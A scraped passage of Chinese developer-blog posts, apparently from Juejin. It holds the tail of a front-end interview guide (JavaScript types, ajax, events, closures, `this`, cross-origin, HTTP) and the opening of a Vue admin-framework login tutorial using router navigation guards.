rel=\"nofollow noopener noreferrer\">更多点这里</a></p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-string\">\"iamstring.\"</span>;\n<span class=\"hljs-keyword\">var</span> b = <span class=\"hljs-number\">222</span>;\n<span class=\"hljs-keyword\">var</span> c= [<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>];\n<span class=\"hljs-keyword\">var</span> d = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();\n<span class=\"hljs-keyword\">var</span> e = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{alert(<span class=\"hljs-number\">111</span>);};\n<span class=\"hljs-keyword\">var</span> f = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{<span class=\"hljs-keyword\">this</span>.name=<span class=\"hljs-string\">\"22\"</span>;};\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(a) === ‘[object <span class=\"hljs-built_in\">String</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(b) === ‘[object <span class=\"hljs-built_in\">Number</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(c) === ‘[object <span class=\"hljs-built_in\">Array</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(d) === ‘[object <span class=\"hljs-built_in\">Date</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(e) === ‘[object <span class=\"hljs-built_in\">Function</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;\nalert(<span class=\"hljs-built_in\">Object</span>.prototype.toString.call(f) === ‘[object <span class=\"hljs-built_in\">Function</span>]’) -------&gt; <span class=\"hljs-literal\">true</span>;</code></pre><p><strong>2.XHR具体底层原理(要求手写ajax)</strong></p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">ajax</span>(<span class=\"hljs-params\"></span>)</span>{\n    <span class=\"hljs-keyword\">var</span> xmlhttp;\n    <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">window</span>.XMLHttpRequest){\n        xmlhttp = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();\n    }<span class=\"hljs-keyword\">else</span>{\n        <span class=\"hljs-comment\">// code for IE6, IE5</span>\n        xmlhttp = ActiveXObject(<span class=\"hljs-string\">\"Microsoft.XMLHTTP\"</span>);\n    }\n\n    <span class=\"hljs-comment\">//判定执行状态</span>\n    xmlhttp.onreadystatechange = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n        <span class=\"hljs-comment\">/*\n        readyState\n            0: 请求未初始化\n            1: 服务器连接已建立\n            2: 请求已接收\n            3: 请求处理中\n            4: 请求已完成，且响应已就绪\n        status\n            200:请求成功\n            404:未找到\n            500:服务器内部错误\n        */</span>\n        <span class=\"hljs-keyword\">if</span> (xmlhttp.readyState==<span class=\"hljs-number\">4</span> &amp;&amp; xmlhttp.status==<span class=\"hljs-number\">200</span>){\n            <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"myDiv\"</span>).innerHTML=xmlhttp.responseText;<span class=\"hljs-comment\">//获得字符串形式的响应数据</span>\n        }\n      }\n    xmlhttp.open(<span class=\"hljs-string\">\"Get\"</span>,<span class=\"hljs-string\">\"url\"</span>,<span class=\"hljs-literal\">true</span>);\n\n    <span class=\"hljs-comment\">//设置头信息</span>\n    xmlhttp.setRequestHeader(<span class=\"hljs-string\">\"Content-type\"</span>,<span class=\"hljs-string\">\"application/x-www-form-urlencoded\"</span>);\n\n    <span class=\"hljs-comment\">//将信息发送到服务器</span>\n    xmlhttp.send();    \n\n}</code></pre><p><strong>3.Js事件机制？IE和谷歌，火狐有何区别？</strong><br>下面这段代码是兼容各个浏览器，特别注意的是移除事件时传参必须和绑定时保持一致，尤其是回调函数不能使用匿名函数</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> EventUtil ={\n    <span class=\"hljs-attr\">addHandler</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">element, type, handler</span>)</span>{\n        <span class=\"hljs-keyword\">if</span>(element.addEventListener){<span class=\"hljs-comment\">//标准浏览器webkit，ff</span>\n            element.addEventListener(type, handler, <span class=\"hljs-literal\">false</span>);\n        }\n        <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(element.attachEvent){<span class=\"hljs-comment\">//ie</span>\n            element.attachEvent(<span class=\"hljs-string\">'on'</span> + type,handler);\n        }<span class=\"hljs-keyword\">else</span>{\n            element[<span class=\"hljs-string\">'on'</span> + type] = handler;\n        }\n    },\n    <span class=\"hljs-attr\">removeHandler</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n        <span class=\"hljs-keyword\">if</span>(element.removeEventListener){\n            element.removeEventListener(type, handler, <span class=\"hljs-literal\">false</span>);\n        }<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(element.detachEvent){\n            element.detachEvent(<span class=\"hljs-string\">'on'</span> + type, handler);\n        }<span class=\"hljs-keyword\">else</span>{\n            element[<span class=\"hljs-string\">'on'</span> + type] = <span class=\"hljs-literal\">null</span>;\n        }\n    }\n}</code></pre><p>最好能找到javascript高级程序设计这本书，里面有一章专门讲事件<br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.qdfuns.com%2Fnotes%2F17398%2F8062de2558ef495ce6cb7679f940ae5c.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">我也来说说js的事件机制</a></p>\n<p><strong>4.什么是闭包?堆栈溢出有什么区别？ 内存泄漏? 那些操作会造成内存泄漏？怎么样防止内存泄漏？</strong><br>闭包：就是能够读取其他函数内部变量的函数。<br>堆栈溢出：就是不顾堆栈中分配的局部数据块大小，向该数据块写入了过多的数据，导致数据越界，结果覆盖了别的数据。经常会在递归中发生。<br>内存泄露是指：用动态存储分配函数内存空间，在使用完毕后未释放，导致一直占据该内存单元。直到程序结束。指任何对象在您不再拥有或需要它之后仍然存在。<br>造成内存泄漏：<br>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。<br>闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）<br>防止内存泄露：<br>(1)不要动态绑定事件；<br>(2)不要在动态添加，或者会被动态移除的dom上绑事件，用事件冒泡在父容器监听事件；<br>(3)如果要违反上面的原则，必须提供destroy方法，保证移除dom后事件也被移除，这点可以参考Backbone的源代码，做的比较好；<br>(4)单例化，少创建dom，少绑事件。<br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2009%2F08%2Flearning_javascript_closures.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">学习Javascript闭包</a></p>\n<p><strong>5.js继承</strong><br>这一块是js的重点，要求能够手写<br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fhumin%2Fp%2F4556820.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JS实现继承的几种方式</a><br>想把js整个原型，继承这一块搞清楚的，可以看看这一系列文章<br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fwangfupeng1988%2Fp%2F3977924.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">深入理解javascript原型和闭包</a></p>\n<p><strong>6.es6中let和const</strong><br>const定义的变量不可以修改，而且必须初始化。<br>（1）let的优点是严格了变量声明，不会允许你在同一作用域下重复声明，同时也加入了块级作用域的概念，比如<br>if(<em>*){这使用let就是一个作用域}和for(){let a = </em>};每一次循环体中声明的a是相互独立的分属于不同的作用域;<br>（2）const除了let的作用还多了：改变值或者指针的时候const会报错。</p>\n<p><strong>7.自己实现一个Promise</strong><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fhuansky%2Fp%2F6064402.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">手把手教你实现一个完整的 Promise</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fbdbk%2Fp%2F5176594.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">promise异步编程的原理</a></p>\n<p><strong>8.express和koa区别</strong><br>这个要对node的框架比较熟悉，下面是大牛的解答<br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F38879363\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Express和koa各有啥优缺点</a><br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fyq.aliyun.com%2Farticles%2F3062\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Node.js框架之express与koa对比分析 </a></p>\n<p><strong>9.angular双向绑定实现</strong><br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxufei%2FMake-Your-Own-AngularJS%2Fblob%2Fmaster%2F01.md%23%25E6%259E%2584%25E5%25BB%25BA%25E8%2587%25AA%25E5%25B7%25B1%25E7%259A%2584angularjs%25E7%25AC%25AC%25E4%25B8%2580%25E9%2583%25A8%25E5%2588%2586scope%25E5%2592%258Cdigest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">构建自己的AngularJS，第一部分：Scope和Digest</a></p>\n<p><strong>10.正则匹配</strong><br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F5965943ff265da6c30653879\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JS正则表达式完整教程</a></p>\n<p><strong>11. js中this的指向，如何改变，call和apply和bind的区别 </strong><br>在JavaScript中this可以是全局对象、当前对象或者任意对象，这完全取决于函数的调用方式，this 绑定的对象即函数执行的上下文环境<br>情况1：如果一个函数中有this，但是它没有被上一级的对象所调用，那么this指向的就是window(非严格模式，在严格版中的默认的this不再是window，而是undefined)<br>情况2：如果一个函数中有this，这个函数有被上一级的对象所调用，那么this指向的就是上一级的对象。<br>情况3：如果一个函数中有this，这个函数中包含多个对象，尽管这个函数是被最外层的对象所调用，this指向的也只是它上一级的对象</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 作为对象方法调用</span>\n<span class=\"hljs-keyword\">var</span> test = {\n    <span class=\"hljs-attr\">a</span> : <span class=\"hljs-number\">5</span>,\n    <span class=\"hljs-attr\">b</span> : <span class=\"hljs-number\">6</span>,\n    <span class=\"hljs-attr\">sum</span> : <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.a + <span class=\"hljs-keyword\">this</span>.b;     <span class=\"hljs-comment\">// 此处this = test</span>\n    }\n}\nalert(test.sum());     <span class=\"hljs-comment\">// 11</span></code></pre><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 作为函数调用</span>\na = <span class=\"hljs-number\">4</span>;\nb = <span class=\"hljs-number\">3</span>;\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">sum</span>(<span class=\"hljs-params\"></span>)</span>{\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.a + <span class=\"hljs-keyword\">this</span>.b;         <span class=\"hljs-comment\">// 此处this = window</span>\n}\nalert(sum());      <span class=\"hljs-comment\">// 7</span></code></pre><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> o = {\n    <span class=\"hljs-attr\">a</span>:<span class=\"hljs-number\">10</span>,\n    <span class=\"hljs-attr\">b</span>:{\n        <span class=\"hljs-attr\">a</span>:<span class=\"hljs-number\">12</span>,\n        <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n            <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.a); <span class=\"hljs-comment\">//12</span>\n        }\n    }\n}\no.b.fn();</code></pre><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> o = {\n    <span class=\"hljs-attr\">a</span>:<span class=\"hljs-number\">10</span>,\n    <span class=\"hljs-attr\">b</span>:{\n        <span class=\"hljs-comment\">// a:12,</span>\n        fn:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n            <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.a); <span class=\"hljs-comment\">//undefined</span>\n        }\n    }\n}\no.b.fn();</code></pre><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> o = {\n    <span class=\"hljs-attr\">a</span>:<span class=\"hljs-number\">10</span>,\n    <span class=\"hljs-attr\">b</span>:{\n        <span class=\"hljs-attr\">a</span>:<span class=\"hljs-number\">12</span>,\n        <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n            <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.a); <span class=\"hljs-comment\">//undefined</span>\n            <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>); <span class=\"hljs-comment\">//window</span>\n        }\n    }\n}\n<span class=\"hljs-keyword\">var</span> j = o.b.fn;\nj();</code></pre><p>对于构造函数，this会指向new出来的实例</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">Fn</span>(<span class=\"hljs-params\"></span>)</span>{\n    <span class=\"hljs-keyword\">this</span>.user = <span class=\"hljs-string\">\"萌爷\"</span>;\n}\n<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-keyword\">new</span> Fn();\n<span class=\"hljs-built_in\">console</span>.log(a.user); <span class=\"hljs-comment\">//萌爷</span></code></pre><p>如果返回值是一个对象，那么this指向的就是那个返回的对象，如果返回值不是一个对象那么this还是指向函数的实例。</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fn</span>(<span class=\"hljs-params\"></span>)  \n</span>{  \n    <span class=\"hljs-keyword\">this</span>.user = <span class=\"hljs-string\">'萌爷'</span>;  \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;\n}\n<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-keyword\">new</span> fn;  \n<span class=\"hljs-built_in\">console</span>.log(a.user); <span class=\"hljs-comment\">//萌爷</span></code></pre><pre><code class=\"hljs javascript\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fn</span>(<span class=\"hljs-params\"></span>)  \n</span>{  \n    <span class=\"hljs-keyword\">this</span>.user = <span class=\"hljs-string\">'萌爷'</span>;  \n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{};\n}\n<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-keyword\">new</span> fn;  \n<span class=\"hljs-built_in\">console</span>.log(a.user); <span class=\"hljs-comment\">//undefined</span></code></pre><p><strong>如何改变</strong></p>\n<ol>\n<li>new操作符会改变函数this的指向问题<br>首先new关键字会创建一个空的对象，然后会自动调用一个函数apply方法，将this指向这个空对象，这样的话函数内部的this就会被这个空的对象替代。</li>\n<li>apply或call，bind<br>bind与apply、call最大的区别就是：bind不会立即调用，其他两个会立即调用，如果多次调用bind，那么多出来的次数都是无效的<br>都是用来改变函数的this对象的指向的，第一个参数都是this要指向的对象，都可以利用后续参数传参。<br>将上述一个例子改造一下<pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">var</span> a = {\n <span class=\"hljs-attr\">user</span>:<span class=\"hljs-string\">\"萌爷\"</span>,\n <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{\n     <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-keyword\">this</span>.user); <span class=\"hljs-comment\">//萌爷</span>\n }\n}\n<span class=\"hljs-keyword\">var</span> b = a.fn;\n<span class=\"hljs-keyword\">var</span> c = b.bind(a);\nc();</code></pre><h1 id=\"-\" data-id=\"heading-2\">前端综合知识</h1>\n<strong>1跨域</strong><br>同源策略是由Netscape提出的著名安全策略，是浏览器最核心、基本的安全功能,它限制了一个源(origin)中加载文本或者脚本与来自其他源(origin)中资源的交互方式<br>，所谓的同源就是指协议、域名、端口相同。<br>简单说来，只有当协议，域名，端口相同的时候才算是同一个域名，否则均认为需要做跨域的处理。</li>\n</ol>\n<p></p><figure><img alt=\"同源\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/9/25/17eafe157985d789e229af3bdd4ffab7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>同源</figcaption></figure><p></p>\n<p><strong>解决方法</strong></p>\n<ol>\n<li>JSONP( Script 标签)（不支持Post）</li>\n<li>CORS（Access-Control-Allow-Origin）（存在兼容问题，仅支持 IE 10 以上）<br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2016%2F04%2Fcors.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">跨域资源共享 CORS 详解</a></li>\n<li>Server Proxy(当你需要有跨域的请求操作时发送请求给后端，让后端帮你代为请求，然后最后将获取的结果发送给你)</li>\n<li>location.hash+iframe(数据直接暴露在了 url 中且数据容量和类型都有限)</li>\n<li>window.name</li>\n<li>postMessage</li>\n<li>document.domain(主域相同而子域不同)<br>参考这篇文章<a href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F25778815\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">关于跨域，你想知道的全在这里</a></li>\n</ol>\n<p><strong>2.HTTP综合知识</strong><br>（1）状态码<br>HTTP 响应中包含一个状态码，用来表示服务器对客户端响应的结果。</p>\n<p>状态码一般由3位构成：</p>\n<pre><code class=\"hljs bash\">1xx : 表示请求已经接受了，继续处理。\n2xx : 表示请求已经处理掉了。\n3xx : 重定向。\n4xx : 一般表示客户端有错误，请求无法实现。\n5xx : 一般为服务器端的错误。</code></pre><p>比如常见的状态码：</p>\n<pre><code class=\"hljs bash\">200 OK 客户端请求成功。\n301 Moved Permanently 请求永久重定向。\n302 Moved Temporarily 请求临时重定向。\n304 Not Modified 文件未修改，可以直接使用缓存的文件。\n400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。\n401 Unauthorized 请求未经授权，无法访问。\n403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。\n404 Not Found 请求的资源不存在，比如输入了错误的URL。\n500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。\n503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。</code></pre><p>（2）HTTP请求<br>看这一篇足以<a href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F24913080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">网络基础知识之 HTTP 协议</a></p>\n<p><strong>3.缓存机制</strong><br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000010775131\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">HTTP缓存机制详解</a></p>\n<p><strong>4.当我们在浏览器中输入</strong> <a href=\"https://link.juejin.im?target=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2Fwww.baidu.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">www.baidu.com/**</a> 访问百度的时候浏览器做了哪些事情</p>\n<pre><code class=\"hljs bash\">首先 Chrome 搜索自身的 DNS 缓存。(如果 DNS 缓存中找到百度的 IP 地址，就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)\n搜索操作系统自身的 DNS 缓存。(浏览器没有找到缓存或者缓存已经失效)\n读取硬盘中的 host 文件，里面记录着域名到 IP 地址的映射关系，Mac 电脑中位于 /etc/hosts。(如果前1.2步骤都没有找到)\n浏览器向宽带运营商服务器或者域名服务器发起一个 DNS 解析请求，这里服务器有两种方式解析请求，这在稍后会讲到，之后浏览器获得了百度首页的 IP 地址。\n拿到 IP 地址后，浏览器就向该 IP 所在的服务器建立 TCP 连接(即三次握手)。\n连接建立起来之后，浏览器就可以向服务器发起 HTTP 请求了。(这里比如访问百度首页，就向服务器发起 HTTP 中的 GET 请求)\n服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 HTML 页面代码返回给浏览器。\n浏览器拿到了百度首页的完整 HTML 页面代码，内核和 JS 引擎就会解析和渲染这个页面，里面的 JS，CSS，图片等静态资源也通过一个个 HTTP 请求进行加载。\n浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。\n如果浏览器没有后续的请求，那么就会跟服务器端发起 TCP 断开(即四次挥手)。</code></pre><p><a href=\"https://link.juejin.im?target=http%3A%2F%2Ffex.baidu.com%2Fblog%2F2014%2F05%2Fwhat-happen%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">从输入 URL 到页面加载完成的过程中都发生了什么事情？</a><br><strong>5.性能优化</strong><br>性能优化肯定是参考<a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fxianyulaodi%2Fp%2F5755079.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">雅虎前端优化的35条军规</a></p>\n<p><strong>6.浏览器工作原理详解 </strong><br>这篇文章是以色列开发人员塔利·加希尔的研究成果<a href=\"https://link.juejin.im?target=http%3A%2F%2Fblog.csdn.net%2Fdangnian%2Farticle%2Fdetails%2F50876241\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">浏览器工作原理详解 </a>，强力推荐，深度好文</p>\n<p>到此为止，已经把大部分内容涵盖到了，想看基础点的可以点这里<a href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F28415923\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">html+css</a>，<a href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F28428367\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">js基础</a></p>\n<p><strong>本篇文章主要是针对于理论多一些，对于面试时要求手写一些案例，或者是一些小算法，本篇文章只是略有涉及，希望能够在校招面试中能够帮到大家</strong></p>\n<hr>\n<p>有人在评论中询问了三面的问题，我在写文章有些问题没有放上来，主要是是自己没怎么实践过，我在下面会列出来，大家有好的答案也可以分享出来<br>1.node异常捕获 <a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.alloyteam.com%2F2013%2F12%2Fnode-js-series-exception-caught%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Node.js捕获异常的一些探索</a><br>2.前端性能监控<br>3.js继承+闭包，手写了组合继承<br>4.js实现双向绑定<br>5.为何不用koa，而用express，区别？<br>6.项目架构图<br>7.负载均衡<br>8.node与java等比较</p>\n<p><strong>如果您喜欢这篇文章，可以点个赞，本文会很长，建议您收藏下来，方便日后回顾</strong></p>\n<p>如有任何错误，欢迎指正！如有任何问题，欢迎跟我交流！<a href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F59af60acf265da24701ee7da\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">掘金技术征文</a></p>\n</div>"},{"title":"一步步带你做vue后台管理框架 - 登录功能","avatar":"https://user-gold-cdn.xitu.io/2017/9/3/6f562f7b90634203e57fc706d88eac1d?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"herozhou工巧","create_time":"2017 年 09 月 19 日","tags":["Node.js","Vue.js","HTML","CSS","JavaScript","前端框架","前端","程序员","Webpack","Vuex","vue-router"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 id=\"-vue-\" data-id=\"heading-0\">系列教程《一步步带你做vue后台管理框架》第三课</h2>\n<p><strong>github地址：<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fherozhou%2Fvue-framework-wz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-framework-wz</a></strong><br><strong>线上体验地址：<a href=\"https://link.juejin.im?target=http%3A%2F%2Fherozhou.coding.me%2Fvue-framework-wz%2F%23%2Fdashboard\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">立即体验</a></strong></p>\n<p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fherozhou%2Fp%2F7434931.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">《一步步带你做vue后台管理框架》第一课：介绍框架</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fherozhou%2Fp%2F7441702.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">《一步步带你做vue后台管理框架》第二课：上手使用</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fherozhou%2Fp%2F7469667.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">《一步步带你做vue后台管理框架》第三课：登录功能</a></p>\n<h3 id=\"-\" data-id=\"heading-1\">认证简介</h3>\n<p>认证又称“验证”、“鉴权”，是指通过一定的手段，完成对用户身份的确认。身份验证的方法有很多，基本上可分为：基于共享密钥的身份验证、基于生物学特征的身份验证和基于公开密钥加密算法的身份验证。</p>\n<p>登录鉴权功能是后台管理项目的基本需求，登录控制，权限分配，这些都是很普遍的功能。 在框架中已经做好了这部分的工作，我们来了解一下是怎么做的，对以后在框架的基础上做改进是有很大的帮助的。</p>\n<h4 id=\"passport\" data-id=\"heading-2\">Passport</h4>\n<p>在此之前思考过很多种方法去做登录功能，一种比较靠谱的方法是用一个Node服务端，利用Node+express+passport的技术栈</p>\n<blockquote>\n<p>Passport项目是一个基于Nodejs的认证中间件，支持本地登录和第三方账号登录验证。Passport目的只是为了“登陆认证”，因此，代码干净，易维护，可以方便地集成到其他的应用中。</p>\n<blockquote>\n<p>Web应用一般有2种登陆认证的形式：</p>\n<ul>\n<li>用户名和密码认证登陆</li>\n<li>OAuth认证登陆</li>\n</ul>\n</blockquote>\n<p>Passport可以根据应用程序的特点，配置不同的认证机制。<br>　　项目网站：<a href=\"https://link.juejin.im?target=http%3A%2F%2Fpassportjs.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">passportjs.org/</a></p>\n</blockquote>\n<p>Passport是十分强大的，这个技术栈也是非常靠谱的，但是我们就一个纯前端框架，需要再做一个Node的服务端吗？维护起来显然增加了我们的负担</p>\n<p>况且违背了Unix哲学的<strong>'简单原则'----尽量用简单的方法解决问题----是'Unix哲学'的根本原则</strong>。这也就是著名的KISS（keep it simple, stupid），意思是'保持简单和笨拙'。。</p>\n<p>既然这样不太好，那就使用单页应用强大的路由来做登录。</p>\n<h4 id=\"vue-router\" data-id=\"heading-3\">vue-router</h4>\n<p>如果对vue-router还不熟悉的同学一定要找尤大大课后开小灶了<br>官方文档：<a href=\"https://link.juejin.im?target=https%3A%2F%2Frouter.vuejs.org%2Fzh-cn%2Fadvanced%2Fnavigation-guards.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">vue-router</a></p>\n<p>你可以使用</p>\n<pre><code class=\"hljs bash\">router.beforeEach</code></pre><p>注册一个全局的before钩子：</p>\n<pre><code class=\"hljs bash\">const router = new VueRouter({ ... })router.beforeEach((to, from, next) =&gt; { // ...})</code></pre><p> 当一个导航触发时，全局的 before 钩子按照创建顺序调用。钩子是异步解析执行，此时导航在所有钩子 resolve 完之前一直处于 等待中。</p>\n<p>每个钩子方法接收三个参数：　　</p>\n<pre><code class=\"hljs bash\">to: Route: 即将要进入的目标 [路由对象]\n\nfrom: Route: 当前导航正要离开的路由\n\nnext: Function: 一定要调用该方法来 resolve 这个钩子。执行效果依赖 next 方法的调用参数。\n\n    next(): 进行管道中的下一个钩子。如果全部钩子执行完了，则导航的状态就是 confirmed （确认的）。\n\n    next(<span class=\"hljs-literal\">false</span>): 中断当前的导航。如果浏览器的 URL 改变了（可能是用户手动或者浏览器后退按钮），那么 URL 地址会重置到 from路由对应的地址。\n\n    next(<span class=\"hljs-string\">'/'</span>)或者 next({ path: <span class=\"hljs-string\">'/'</span> })： 跳转到一个不同的地址。当前的导航被中断，然后进行一个新的导航。\n\n　　确保要调用 next 方法，否则钩子就不会被 resolved。</code></pre><p>　　所以wz框架采用的方式是使用vue router.beforeEach 拦截导航，判断登录与否和是否有权限，选择完成继续跳转或重定向到登录界面。</p>\n<blockquote>\n<p>这篇教程分为两部分一部分讲登录，另一部分讲权限验证，因为篇幅太长所以需要用两篇来写。</p>\n</blockquote>\n<h4 id=\"-\" 